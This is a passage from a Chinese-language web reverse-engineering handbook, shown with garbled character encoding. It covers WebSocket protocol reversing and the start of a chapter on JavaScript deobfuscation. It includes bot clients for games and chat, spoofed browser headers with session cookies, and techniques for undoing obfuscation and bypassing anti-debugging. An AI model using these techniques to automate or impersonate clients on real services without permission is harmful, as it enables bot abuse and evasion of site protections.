<p><strong>.proto å®šä¹‰</strong>:</p>
<pre><code class="language-protobuf">syntax = &quot;proto3&quot;;

message GameMessage {
    enum Type {
        LOGIN = 0;
        MOVE = 1;
        CHAT = 2;
    }

    Type type = 1;
    int32 user_id = 2;
    int64 timestamp = 3;
    bytes payload = 4;
}

message MovePayload {
    float x = 1;
    float y = 2;
    float z = 3;
}
</code></pre>
<p><strong>ç¼–è¯‘ .proto</strong>:</p>
<pre><code class="language-bash">protoc --python_out=. game.proto
</code></pre>
<p><strong>Python å®¢æˆ·ç«¯</strong>:</p>
<pre><code class="language-python">import asyncio
import websockets
import game_pb2
import time

async def game_client():
    uri = &quot;wss://game.example.com/ws&quot;

    async with websockets.connect(uri) as ws:
        # å‘é€ç™»å½•æ¶ˆæ¯
        login_msg = game_pb2.GameMessage()
        login_msg.type = game_pb2.GameMessage.LOGIN
        login_msg.user_id = 12345
        login_msg.timestamp = int(time.time())
        await ws.send(login_msg.SerializeToString())

        # å‘é€ç§»åŠ¨æ¶ˆæ¯
        move_msg = game_pb2.GameMessage()
        move_msg.type = game_pb2.GameMessage.MOVE
        move_msg.user_id = 12345
        move_msg.timestamp = int(time.time())

        # åµŒå…¥ç§»åŠ¨æ•°æ®
        move_payload = game_pb2.MovePayload()
        move_payload.x = 100.5
        move_payload.y = 200.3
        move_payload.z = 50.0
        move_msg.payload = move_payload.SerializeToString()

        await ws.send(move_msg.SerializeToString())

        # æ¥æ”¶æ¶ˆæ¯
        while True:
            data = await ws.recv()
            msg = game_pb2.GameMessage()
            msg.ParseFromString(data)
            print(f&quot;æ”¶åˆ°æ¶ˆæ¯: type={msg.type}, user_id={msg.user_id}&quot;)

asyncio.run(game_client())
</code></pre>
<h3>æ¡ˆä¾‹ 3ï¼šèŠå¤©åº”ç”¨åè®®</h3>
<p><strong>ç›®æ ‡</strong>: è‡ªåŠ¨å‘é€æ¶ˆæ¯åˆ°èŠå¤©å®¤</p>
<p><strong>åˆ†æè¿‡ç¨‹</strong>:</p>
<ol>
<li>å‘ç°æ¶ˆæ¯æ ¼å¼ä¸º JSON</li>
<li>éœ€è¦å…ˆè®¤è¯ï¼Œç„¶åä¿æŒå¿ƒè·³</li>
<li>åºåˆ—å· (seq) å¿…é¡»é€’å¢</li>
</ol>
<p><strong>å®Œæ•´è„šæœ¬</strong>:</p>
<pre><code class="language-python">import asyncio
import websockets
import json
import time

class ChatClient:
    def __init__(self, username, password):
        self.username = username
        self.password = password
        self.seq = 0
        self.ws = None

    def next_seq(self):
        &quot;&quot;&quot;ç”Ÿæˆä¸‹ä¸€ä¸ªåºåˆ—å·&quot;&quot;&quot;
        self.seq += 1
        return self.seq

    async def connect(self):
        &quot;&quot;&quot;è¿æ¥å¹¶è®¤è¯&quot;&quot;&quot;
        self.ws = await websockets.connect(&quot;wss://chat.example.com/ws&quot;)

        # å‘é€è®¤è¯æ¶ˆæ¯
        await self.ws.send(json.dumps({
            &quot;seq&quot;: self.next_seq(),
            &quot;type&quot;: &quot;auth&quot;,
            &quot;username&quot;: self.username,
            &quot;password&quot;: self.password
        }))

        # ç­‰å¾…è®¤è¯å“åº”
        response = await self.ws.recv()
        data = json.loads(response)

        if data.get(&quot;type&quot;) == &quot;auth_success&quot;:
            print(&quot;è®¤è¯æˆåŠŸ&quot;)
            return True
        else:
            print(&quot;è®¤è¯å¤±è´¥:&quot;, data)
            return False

    async def send_chat(self, room_id, message):
        &quot;&quot;&quot;å‘é€èŠå¤©æ¶ˆæ¯&quot;&quot;&quot;
        await self.ws.send(json.dumps({
            &quot;seq&quot;: self.next_seq(),
            &quot;type&quot;: &quot;chat&quot;,
            &quot;room_id&quot;: room_id,
            &quot;message&quot;: message,
            &quot;timestamp&quot;: int(time.time() * 1000)
        }))

    async def heartbeat_loop(self):
        &quot;&quot;&quot;å¿ƒè·³å¾ªç¯&quot;&quot;&quot;
        while True:
            await asyncio.sleep(30)
            await self.ws.send(json.dumps({
                &quot;seq&quot;: self.next_seq(),
                &quot;type&quot;: &quot;ping&quot;
            }))

    async def receive_loop(self):
        &quot;&quot;&quot;æ¥æ”¶æ¶ˆæ¯å¾ªç¯&quot;&quot;&quot;
        while True:
            message = await self.ws.recv()
            data = json.loads(message)
            print(f&quot;[{data['seq']}] {data['type']}: {data.get('message', '')}&quot;)

    async def run(self):
        &quot;&quot;&quot;è¿è¡Œå®¢æˆ·ç«¯&quot;&quot;&quot;
        if await self.connect():
            # å‘é€æµ‹è¯•æ¶ˆæ¯
            await self.send_chat(room_id=1, message=&quot;Hello from bot!&quot;)

            # å¹¶å‘è¿è¡Œæ¥æ”¶å’Œå¿ƒè·³
            await asyncio.gather(
                self.receive_loop(),
                self.heartbeat_loop()
            )

# ä½¿ç”¨
async def main():
    client = ChatClient(&quot;bot_user&quot;, &quot;bot_password&quot;)
    await client.run()

asyncio.run(main())
</code></pre>
<hr />
<h2>8. å¸¸è§é—®é¢˜ä¸è°ƒè¯•</h2>
<h3>8.1 è¿æ¥å¤±è´¥</h3>
<p><strong>é”™è¯¯</strong>: <code>WebSocketException: Invalid HTTP status code: 403</code></p>
<p><strong>åŸå› </strong>:</p>
<ul>
<li>ç¼ºå°‘å¿…è¦çš„ Headersï¼ˆå¦‚ Originã€User-Agentï¼‰</li>
<li>Token è¿‡æœŸæˆ–æ— æ•ˆ</li>
<li>IP è¢«å°ç¦</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-python"># æ·»åŠ å®Œæ•´çš„ Headers
ws = await websockets.connect(
    uri,
    extra_headers={
        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&quot;,
        &quot;Origin&quot;: &quot;https://example.com&quot;,
        &quot;Referer&quot;: &quot;https://example.com/chat&quot;,
        &quot;Cookie&quot;: &quot;session=YOUR_SESSION_COOKIE&quot;
    }
)
</code></pre>
<h3>8.2 å¿ƒè·³è¶…æ—¶</h3>
<p><strong>ç°è±¡</strong>: è¿æ¥è¿‡å‡ åˆ†é’Ÿåè‡ªåŠ¨æ–­å¼€</p>
<p><strong>åŸå› </strong>: æœåŠ¡å™¨è¦æ±‚å®šæœŸå‘é€å¿ƒè·³ï¼Œå¦åˆ™ä¼šä¸»åŠ¨å…³é—­è¿æ¥</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-python">async def heartbeat_loop(self):
    while self.running:
        try:
            await asyncio.wait_for(
                self.ws.send(json.dumps({&quot;type&quot;: &quot;ping&quot;})),
                timeout=5.0  # 5 ç§’è¶…æ—¶
            )
            await asyncio.sleep(30)  # æ¯ 30 ç§’å‘é€ä¸€æ¬¡
        except asyncio.TimeoutError:
            print(&quot;[å¿ƒè·³è¶…æ—¶]&quot;)
            break
</code></pre>
<h3>8.3 æ¶ˆæ¯ä¹±åº</h3>
<p><strong>ç°è±¡</strong>: æ”¶åˆ°çš„æ¶ˆæ¯é¡ºåºä¸å¯¹</p>
<p><strong>åŸå› </strong>: ç½‘ç»œå»¶è¿Ÿæˆ–æœåŠ¡å™¨å¹¶å‘å¤„ç†</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>: ä½¿ç”¨åºåˆ—å· (seq) é‡æ–°æ’åº</p>
<pre><code class="language-python">class MessageQueue:
    def __init__(self):
        self.queue = {}
        self.next_seq = 1

    def add_message(self, seq, data):
        &quot;&quot;&quot;æ·»åŠ æ¶ˆæ¯&quot;&quot;&quot;
        self.queue[seq] = data
        self.process_queue()

    def process_queue(self):
        &quot;&quot;&quot;æŒ‰åºå¤„ç†æ¶ˆæ¯&quot;&quot;&quot;
        while self.next_seq in self.queue:
            data = self.queue.pop(self.next_seq)
            print(f&quot;[å¤„ç†æ¶ˆæ¯ {self.next_seq}] {data}&quot;)
            self.next_seq += 1
</code></pre>
<h3>8.4 è°ƒè¯•æŠ€å·§</h3>
<p><strong>æ‰“å°åå…­è¿›åˆ¶</strong>:</p>
<pre><code class="language-python">def hex_dump(data):
    &quot;&quot;&quot;æ‰“å°åå…­è¿›åˆ¶&quot;&quot;&quot;
    hex_str = ' '.join(f'{b:02x}' for b in data)
    print(f&quot;[Hex] {hex_str}&quot;)

# ä½¿ç”¨
async def handle_message(self, message):
    if isinstance(message, bytes):
        hex_dump(message)
</code></pre>
<p><strong>ä¿å­˜åˆ°æ–‡ä»¶</strong>:</p>
<pre><code class="language-python">import datetime

def log_message(message, direction):
    &quot;&quot;&quot;è®°å½•æ¶ˆæ¯åˆ°æ–‡ä»¶&quot;&quot;&quot;
    timestamp = datetime.datetime.now().isoformat()
    with open('ws_log.txt', 'a') as f:
        f.write(f&quot;[{timestamp}] {direction}\n{message}\n\n&quot;)

# ä½¿ç”¨
async def send_message(self, data):
    message = json.dumps(data)
    log_message(message, &quot;SEND&quot;)
    await self.ws.send(message)

async def handle_message(self, message):
    log_message(message, &quot;RECV&quot;)
    # ... å¤„ç†é€»è¾‘
</code></pre>
<hr />
<h2>9. å·¥å…·æ¨è</h2>
<table>
<thead>
<tr>
  <th>å·¥å…·</th>
  <th>ç”¨é€”</th>
  <th>å¹³å°</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Chrome DevTools</strong></td>
  <td>æµè§ˆå™¨å†… WS æŠ“åŒ…è°ƒè¯•</td>
  <td>Chrome</td>
</tr>
<tr>
  <td><strong>Wireshark</strong></td>
  <td>æ·±åº¦åŒ…åˆ†æã€SSL è§£å¯†</td>
  <td>å…¨å¹³å°</td>
</tr>
<tr>
  <td><strong>mitmproxy</strong></td>
  <td>å¯ç¼–ç¨‹æ‹¦æˆªå’Œä¿®æ”¹</td>
  <td>å…¨å¹³å°</td>
</tr>
<tr>
  <td><strong>wscat</strong></td>
  <td>å‘½ä»¤è¡Œ WS å®¢æˆ·ç«¯æµ‹è¯•</td>
  <td>Node.js</td>
</tr>
<tr>
  <td><strong>websocat</strong></td>
  <td>é«˜çº§å‘½ä»¤è¡Œ WS å·¥å…·</td>
  <td>Rust</td>
</tr>
<tr>
  <td><strong>Postman</strong></td>
  <td>API æµ‹è¯•ï¼ˆæ”¯æŒ WSï¼‰</td>
  <td>å…¨å¹³å°</td>
</tr>
</tbody>
</table>
<p><strong>wscat ä½¿ç”¨</strong>:</p>
<pre><code class="language-bash">npm install -g wscat

# è¿æ¥
wscat -c wss://echo.websocket.org

# å‘é€æ¶ˆæ¯
&gt; Hello WebSocket

# å¸¦ Header
wscat -c wss://example.com/ws -H &quot;Authorization: Bearer token123&quot;
</code></pre>
<hr />
<h2>æ€»ç»“</h2>
<p>WebSocket é€†å‘çš„å…³é”®æ­¥éª¤ï¼š</p>
<ol>
<li>âœ… <strong>æŠ“åŒ…åˆ†æ</strong>: Chrome DevTools / Wireshark / mitmproxy</li>
<li>âœ… <strong>åè®®è¯†åˆ«</strong>: JSON / Protobuf / MsgPack / è‡ªå®šä¹‰æ ¼å¼</li>
<li>âœ… <strong>Hook æŠ€æœ¯</strong>: åŠ«æŒ WebSocket æ„é€ å‡½æ•°å’Œæ–¹æ³•</li>
<li>âœ… <strong>å®¢æˆ·ç«¯å®ç°</strong>: Python websockets åº“ï¼Œå¤„ç†è®¤è¯ã€å¿ƒè·³ã€é‡è¿</li>
<li>âœ… <strong>åŠ å¯†å¤„ç†</strong>: AES/RSA åŠ å¯†æ¶ˆæ¯çš„åŠ è§£å¯†</li>
<li>âœ… <strong>è°ƒè¯•æŠ€å·§</strong>: æ—¥å¿—è®°å½•ã€åå…­è¿›åˆ¶ dumpã€æ¶ˆæ¯é‡æ’åº</li>
</ol>
<p><strong>è®°ä½</strong>: WebSocket é€†å‘çš„æœ¬è´¨æ˜¯<strong>åè®®é€†å‘</strong> â€”â€” ææ¸…æ¥šå®ƒ&quot;è¯´ä»€ä¹ˆè¯&quot;ï¼ˆPayload æ ¼å¼ï¼‰ä»¥åŠ&quot;æ€ä¹ˆè¯´è¯&quot;ï¼ˆçŠ¶æ€æœºã€å¿ƒè·³ã€è®¤è¯ï¼‰ï¼Œä½ å°±èƒ½ä¼ªé€ å®ƒã€‚</p>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-30">åŠ¨æ€å‚æ•°åˆ†æ</a></li>
<li><a href="#section-28">API é€†å‘ä¸é‡æ”¾æ”»å‡»</a></li>
<li><a href="#section-19">Wireshark ä½¿ç”¨æŒ‡å—</a></li>
<li><a href="#section-27">Hooking æŠ€æœ¯</a></li>
<li><a href="#section-29">åŠ å¯†ç®—æ³•è¯†åˆ«</a></li>
</ul>

                                            </div>
                                            </div>
                    <div class="chapter">
                        <h1 class="no-page-break">Part V: Advanced Recipes</h1>
                    
                                            <div class="section" id="section-32">
                                                <h2>[R31] JavaScript Deobfuscation</h2>
                                                <h1>R31: JavaScript åæ··æ·† (Deobfuscation)</h1>
<p>ä½¿ç”¨ AST å·¥å…·å’Œæ‰‹åŠ¨æŠ€å·§ï¼Œè¿˜åŸæ··æ·†ä»£ç çš„å¯è¯»æ€§ï¼Œå¿«é€Ÿå®šä½æ ¸å¿ƒåŠ å¯†é€»è¾‘ã€‚</p>
<hr />
<h2>ğŸ“Š é…æ–¹ä¿¡æ¯</h2>
<table>
<thead>
<tr>
  <th>é¡¹ç›®</th>
  <th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>éš¾åº¦</strong></td>
  <td>â­â­â­â­ (é«˜çº§)</td>
</tr>
<tr>
  <td><strong>é¢„è®¡æ—¶é—´</strong></td>
  <td>2-8 å°æ—¶ (æ ¹æ®æ··æ·†å¤æ‚åº¦)</td>
</tr>
<tr>
  <td><strong>æ‰€éœ€å·¥å…·</strong></td>
  <td>Chrome DevTools, Babel, AST Explorer, Node.js</td>
</tr>
<tr>
  <td><strong>é€‚ç”¨åœºæ™¯</strong></td>
  <td>æ··æ·†ä»£ç åˆ†æã€åŠ å¯†ç®—æ³•æå–ã€æ¶æ„ä»£ç åˆ†æ</td>
</tr>
</tbody>
</table>
<hr />
<h2>ğŸ¯ å­¦ä¹ ç›®æ ‡</h2>
<p>å®Œæˆæœ¬é…æ–¹åï¼Œä½ å°†èƒ½å¤Ÿï¼š</p>
<ul>
<li>âœ… è¯†åˆ«å¸¸è§çš„æ··æ·†æŠ€æœ¯ç±»å‹</li>
<li>âœ… ä½¿ç”¨ AST å·¥å…·æ‰¹é‡è¿˜åŸæ··æ·†ä»£ç </li>
<li>âœ… æ‰‹åŠ¨åˆ†æå’Œè¿˜åŸå…³é”®é€»è¾‘</li>
<li>âœ… å¤„ç†å­—ç¬¦ä¸²æ•°ç»„ã€æ§åˆ¶æµå¹³å¦åŒ–ç­‰é«˜çº§æ··æ·†</li>
<li>âœ… ä½¿ç”¨è°ƒè¯•æŠ€å·§ç»•è¿‡æ··æ·†ä»£ç </li>
</ul>
<hr />
<h2>ğŸ’¡ æ ¸å¿ƒæ¦‚å¿µ</h2>
<p>æ··æ·† (Obfuscation) æ˜¯ Web é€†å‘æœ€å¤§çš„æ‹¦è·¯è™ã€‚ä»£ç æ··æ·†æŠ€æœ¯é€šè¿‡å˜æ¢ä»£ç ç»“æ„å’Œè¯­ä¹‰ï¼Œåœ¨ä¸æ”¹å˜ç¨‹åºåŠŸèƒ½çš„å‰æä¸‹å¤§å¹…å¢åŠ é€†å‘åˆ†æçš„éš¾åº¦ã€‚å¸¸è§çš„æ··æ·†æ‰‹æ®µåŒ…æ‹¬å˜é‡åå‹ç¼©ã€å­—ç¬¦ä¸²æ•°ç»„åŠ å¯†ã€å¤§æ•´æ•°è¿ç®—ã€æ§åˆ¶æµå¹³å¦åŒ–ã€æ­»ä»£ç æ³¨å…¥ç­‰ã€‚</p>
<p><strong>åæ··æ·†çš„æœ¬è´¨</strong>ï¼šé€šè¿‡è‡ªåŠ¨åŒ–æˆ–æ‰‹åŠ¨æ‰‹æ®µè¿˜åŸä»£ç çš„å¯è¯»æ€§ï¼Œç†è§£æ ¸å¿ƒåŠ å¯†é€»è¾‘ã€‚</p>
<p><strong>é‡è¦æé†’</strong>ï¼šåæ··æ·†ä¸æ˜¯ç›®çš„ï¼Œ<strong>ç†è§£é€»è¾‘</strong>æ‰æ˜¯ã€‚æœ‰æ—¶æˆ‘ä»¬ä¸éœ€è¦è¿˜åŸå…¨éƒ¨ä»£ç ï¼Œåªè¦æŠŠå…³é”®çš„åŠ å¯†å‡½æ•°è¿˜åŸå‡ºæ¥ï¼Œæˆ–è€…ç›´æ¥æ‰¾åˆ°è°ƒç”¨å…¥å£å³å¯ã€‚</p>
<p><strong>åæ··æ·†ç­–ç•¥</strong>:</p>
<pre><code>1. è¯†åˆ«æ··æ·†ç±»å‹ â†’ 2. é€‰æ‹©å·¥å…·/æ–¹æ³• â†’ 3. å±€éƒ¨è¿˜åŸ â†’ 4. ç†è§£é€»è¾‘ â†’ 5. æå–å…³é”®ä»£ç 
</code></pre>
<hr />
<h2>1. æ··æ·†æŠ€æœ¯åˆ†ç±»</h2>
<h3>1.1 å˜é‡åæ··æ·† (Identifier Mangling)</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>æ‰€æœ‰å˜é‡ã€å‡½æ•°åå˜æˆæ— æ„ä¹‰çš„çŸ­å­—ç¬¦: <code>a</code>, <code>b</code>, <code>_0x1234</code></li>
<li>ç±»ä¼¼å‹ç¼©å™¨ï¼ˆUglifyã€Terserï¼‰çš„è¾“å‡º</li>
</ul>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// åŸå§‹ä»£ç 
function calculatePrice(basePrice, discount) {
  return basePrice * (1 - discount);
}

// æ··æ·†å
function a(b, c) {
  return b * (1 - c);
}
</code></pre>
<p><strong>å¯¹æŠ—æ–¹æ³•</strong>:</p>
<ul>
<li>ä½¿ç”¨ Chrome DevTools çš„ &quot;Rename Symbol&quot; åŠŸèƒ½æ‰‹åŠ¨é‡å‘½å</li>
<li>ä½¿ç”¨ JSNice (http://jsnice.org/) è‡ªåŠ¨æ¨æµ‹å˜é‡å</li>
<li>é€šè¿‡ä¸Šä¸‹æ–‡ç†è§£å˜é‡å«ä¹‰</li>
</ul>
<hr />
<h3>1.2 å­—ç¬¦ä¸²æ•°ç»„æ··æ·† (String Array Obfuscation)</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>ä»£ç é¡¶éƒ¨æœ‰ä¸€ä¸ªå·¨å¤§çš„å­—ç¬¦ä¸²æ•°ç»„: <code>var _0x1234 = ['str1', 'str2', ...]</code></li>
<li>å­—ç¬¦ä¸²é€šè¿‡ç´¢å¼•è®¿é—®: <code>_0x1234[0]</code> è€Œä¸æ˜¯ç›´æ¥å†™ <code>'str1'</code></li>
<li>é€šå¸¸é…åˆæ•°ç»„æ—‹è½¬ï¼ˆShuffleï¼‰å’Œè§£å¯†å‡½æ•°</li>
</ul>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// æ··æ·†åçš„ä»£ç 
var _0xabcd = [&quot;aGVsbG8=&quot;, &quot;d29ybGQ=&quot;, &quot;Y29uc29sZQ==&quot;, &quot;bG9n&quot;];
(function (_0x4a5b3e, _0x2f8c1d) {
  var _0x3e7a90 = function (_0x1c9f47) {
    while (--_0x1c9f47) {
      _0x4a5b3e[&quot;push&quot;](_0x4a5b3e[&quot;shift&quot;]());
    }
  };
  _0x3e7a90(++_0x2f8c1d);
})(_0xabcd, 0x123);

var _0x5678 = function (_0x4a5b3e, _0x2f8c1d) {
  _0x4a5b3e = _0x4a5b3e - 0x0;
  var _0x3e7a90 = _0xabcd[_0x4a5b3e];
  if (_0x5678[&quot;initialized&quot;] === undefined) {
    // Base64 è§£ç é€»è¾‘
    _0x5678[&quot;decoder&quot;] = function (_0x1c9f47) {
      // ...è§£ç ä»£ç 
    };
    _0x5678[&quot;initialized&quot;] = ![];
  }
  var _0x1c9f47 = _0x5678[&quot;decoder&quot;](_0x3e7a90);
  return _0x1c9f47;
};

console[_0x5678(&quot;0x0&quot;)](_0x5678(&quot;0x1&quot;)); // å®é™…æ˜¯ console.log('hello')
</code></pre>
<p><strong>å¯¹æŠ—æ–¹æ³•</strong>:</p>
<ol>
<li>åœ¨ Console ä¸­æ‰§è¡Œæ•°ç»„å’Œæ—‹è½¬å‡½æ•°ï¼Œä½¿å…¶åˆå§‹åŒ–</li>
<li>åœ¨ Console ä¸­æŒ‚è½½è§£å¯†å‡½æ•° <code>_0x5678</code></li>
<li>ä½¿ç”¨æ­£åˆ™æ›¿æ¢ï¼š<code>_0x5678\('0x(\d+)'\)</code> â†’ æ‰§è¡Œå¹¶æ›¿æ¢ä¸ºçœŸå®å­—ç¬¦ä¸²</li>
<li>ä½¿ç”¨ AST å·¥å…·è‡ªåŠ¨è¿˜åŸï¼ˆè¯¦è§åæ–‡ï¼‰</li>
</ol>
<hr />
<h3>1.3 æ§åˆ¶æµå¹³å¦åŒ– (Control Flow Flattening)</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>æ•´ä¸ªå‡½æ•°å˜æˆä¸€ä¸ª <code>while(true)</code> å¾ªç¯</li>
<li>ä½¿ç”¨ <code>switch-case</code> çŠ¶æ€æœºæ§åˆ¶æ‰§è¡Œæµç¨‹</li>
<li>ä»£ç å—è¢«æ‰“ä¹±ï¼Œé€šè¿‡çŠ¶æ€å˜é‡è·³è½¬</li>
</ul>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// åŸå§‹ä»£ç 
function add(a, b) {
  var result = a + b;
  console.log(result);
  return result;
}

// å¹³å¦åŒ–å
function add(a, b) {
  var _0x1 = &quot;3|1|0|4|2&quot;.split(&quot;|&quot;),
    _0x2 = 0;
  while (!![]) {
    switch (_0x1[_0x2++]) {
      case &quot;0&quot;:
        console.log(result);
        continue;
      case &quot;1&quot;:
        result = a + b;
        continue;
      case &quot;2&quot;:
        return result;
      case &quot;3&quot;:
        var result;
        continue;
      case &quot;4&quot;:
        // å¯èƒ½æ’å…¥çš„åƒåœ¾ä»£ç 
        continue;
    }
    break;
  }
}
</code></pre>
<p><strong>å¯¹æŠ—æ–¹æ³•</strong>:</p>
<ul>
<li><strong>æ‰‹åŠ¨åˆ†æ</strong>ï¼šè®°å½•çŠ¶æ€è½¬ç§»è·¯å¾„ï¼Œæ‰‹åŠ¨é‡ç»„ä»£ç å—</li>
<li><strong>AST è¿˜åŸ</strong>ï¼šè§£æçŠ¶æ€æœºçš„è·³è½¬é€»è¾‘ï¼Œè‡ªåŠ¨é‡å»ºä»£ç é¡ºåºï¼ˆéœ€è¦é«˜çº§ AST æŠ€å·§ï¼‰</li>
<li><strong>åŠ¨æ€æ‰§è¡Œ</strong>ï¼šç›´æ¥è°ƒç”¨å‡½æ•°ï¼Œé€šè¿‡è¾“å…¥è¾“å‡ºæ¨æ–­é€»è¾‘</li>
</ul>
<hr />
<h3>1.4 åƒµå°¸ä»£ç æ³¨å…¥ (Dead Code Injection)</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>æ’å…¥å¤§é‡æ°¸è¿œä¸ä¼šæ‰§è¡Œçš„ä»£ç å—</li>
<li>ä½¿ç”¨ <code>if (false)</code> æˆ–æ°¸è¿œä¸ºå‡çš„å¤æ‚æ¡ä»¶</li>
</ul>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">function encrypt(data) {
  if (Math.random() &lt; 0) {
    // è¿™æ®µä»£ç æ°¸è¿œä¸ä¼šæ‰§è¡Œ
    return decrypt(data);
  }
  var result = md5(data);
  if (!![] &amp;&amp; ![]) {
    // åˆæ˜¯æ­»ä»£ç 
    result = sha256(data);
  }
  return result;
}
</code></pre>
<p><strong>å¯¹æŠ—æ–¹æ³•</strong>:</p>
<ul>
<li>ä½¿ç”¨ Babel çš„å¸¸é‡æŠ˜å  (Constant Folding) ä¼˜åŒ–</li>
<li>æ‰‹åŠ¨è¯†åˆ«å¹¶åˆ é™¤æ˜æ˜¾çš„æ­»ä»£ç åˆ†æ”¯</li>
</ul>
<hr />
<h3>1.5 æ•°å­—/å­—ç¬¦ä¸²ç¼–ç  (Encoding)</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>æ•°å­—è¢«ç¼–ç ä¸ºåå…­è¿›åˆ¶ã€å…«è¿›åˆ¶ã€æˆ–è®¡ç®—è¡¨è¾¾å¼</li>
<li>å­—ç¬¦ä¸²è¢« Base64ã€Unicode è½¬ä¹‰ã€æˆ–è‡ªå®šä¹‰ç¼–ç </li>
</ul>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// åŸå§‹
var port = 443;
var msg = &quot;Hello&quot;;

// æ··æ·†å
var port = 0x1bb; // åå…­è¿›åˆ¶
var port = 0o673; // å…«è¿›åˆ¶
var port = 500 - 57; // è®¡ç®—è¡¨è¾¾å¼
var msg = atob(&quot;SGVsbG8=&quot;); // Base64
var msg = &quot;\u0048\u0065\u006c\u006c\u006f&quot;; // Unicode
</code></pre>
<p><strong>å¯¹æŠ—æ–¹æ³•</strong>:</p>
<ul>
<li>AST å¸¸é‡æŠ˜å è‡ªåŠ¨è®¡ç®—</li>
<li>åœ¨ Console æ‰‹åŠ¨æ‰§è¡Œç¼–ç å­—ç¬¦ä¸²</li>
</ul>
<hr />
<h3>1.6 ç‰¹æ®Šç¼–ç æ··æ·† (JJEncode / AAEncode / JSFuck)</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li><strong>JJEncode</strong>: å…¨æ˜¯ç¬¦å· <code>$ _ + &quot; â˜ ( ) . !</code></li>
<li><strong>AAEncode</strong>: ä½¿ç”¨ é¢œæ–‡å­— <code>(ã‚šĞ”ã‚š)</code> ç­‰</li>
<li><strong>JSFuck</strong>: ä»…ä½¿ç”¨ <code>[]()!+</code> å…­ä¸ªå­—ç¬¦</li>
</ul>
<p><strong>ç¤ºä¾‹</strong> (JSFuck):</p>
<pre><code class="language-javascript">// alert(1) çš„ JSFuck ç‰ˆæœ¬
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+...
</code></pre>
<p><strong>å¯¹æŠ—æ–¹æ³•</strong>:</p>
<ul>
<li>ç›´æ¥åœ¨ Console æ‰§è¡Œï¼ˆå»æ‰æœ€åçš„ <code>()</code> é¿å…ç«‹å³æ‰§è¡Œï¼‰</li>
<li>ä½¿ç”¨åœ¨çº¿å·¥å…·: https://enkhee-osiris.github.io/Decoder-JSFuck/</li>
<li>è¿™äº›ç¼–ç é€šå¸¸åªæ˜¯å¤–å±‚åŒ…è£…ï¼Œè§£ç åè¿˜éœ€è¦è¿›ä¸€æ­¥åæ··æ·†</li>
</ul>
<hr />
<h2>2. æ··æ·†å™¨è¯†åˆ«</h2>
<h3>2.1 javascript-obfuscator (æœ€å¸¸è§)</h3>
<p><strong>å®˜ç½‘</strong>: https://obfuscator.io/</p>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>é¡¶éƒ¨æœ‰ <code>_0x????</code> æ ¼å¼çš„å­—ç¬¦ä¸²æ•°ç»„</li>
<li>è‡ªæ‰§è¡Œå‡½æ•°è¿›è¡Œæ•°ç»„æ—‹è½¬</li>
<li>å‡½æ•°åã€å˜é‡åå…¨æ˜¯ <code>_0x????</code> æ ¼å¼</li>
<li>å¯èƒ½åŒ…å«æ§åˆ¶æµå¹³å¦åŒ–</li>
</ul>
<p><strong>é…ç½®ç­‰çº§</strong>:</p>
<table>
<thead>
<tr>
  <th>ç­‰çº§</th>
  <th>ç‰¹å¾</th>
  <th>éš¾åº¦</th>
</tr>
</thead>
<tbody>
<tr>
  <td>Low</td>
  <td>ä»…å˜é‡åæ··æ·†</td>
  <td>â­</td>
</tr>
<tr>
  <td>Medium</td>
  <td>+ å­—ç¬¦ä¸²æ•°ç»„</td>
  <td>â­â­</td>
</tr>
<tr>
  <td>High</td>
  <td>+ æ§åˆ¶æµå¹³å¦åŒ–</td>
  <td>â­â­â­â­</td>
</tr>
<tr>
  <td>Extreme</td>
  <td>+ æ­»ä»£ç  + è‡ªæˆ‘é˜²å¾¡</td>
  <td>â­â­â­â­â­</td>
</tr>
</tbody>
</table>
<p><strong>å¯¹æŠ—å·¥å…·</strong>:</p>
<ul>
<li>https://deobfuscate.io/ (é’ˆå¯¹ obfuscator.io)</li>
<li>AST è‡ªå®šä¹‰è„šæœ¬ï¼ˆè§ <a href="#section-59">åæ··æ·†è„šæœ¬</a>ï¼‰</li>
</ul>
<hr />
<h3>2.2 Webpack/Rollup æ‰“åŒ…</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>ç«‹å³æ‰§è¡Œå‡½æ•° <code>(function(modules) { ... })([func1, func2, ...])</code></li>
<li>æ¨¡å—é€šè¿‡ç´¢å¼•è®¿é—®: <code>__webpack_require__(0)</code></li>
<li>æœ‰æ˜æ˜¾çš„æ¨¡å—åŠ è½½å™¨ä»£ç </li>
</ul>
<p><strong>å¯¹æŠ—å·¥å…·</strong>:</p>
<ul>
<li><strong>webcrack</strong>: https://github.com/j4k0xb/webcrack<pre><code class="language-bash">npm install -g webcrack
webcrack bundle.js -o output/
</code></pre>
</li>
<li><strong>webpack-bundle-analyzer</strong>: åˆ†ææ‰“åŒ…ç»“æ„</li>
</ul>
<hr />
<h3>2.3 å•†ä¸šçº§æ··æ·† (Jscrambler, å½¢çŠ¶å®‰å…¨ç­‰)</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<ul>
<li>å¤šå±‚åµŒå¥—æ··æ·†</li>
<li>è™šæ‹Ÿæœºä¿æŠ¤ (JSVMP)</li>
<li>åè°ƒè¯•é™·é˜±</li>
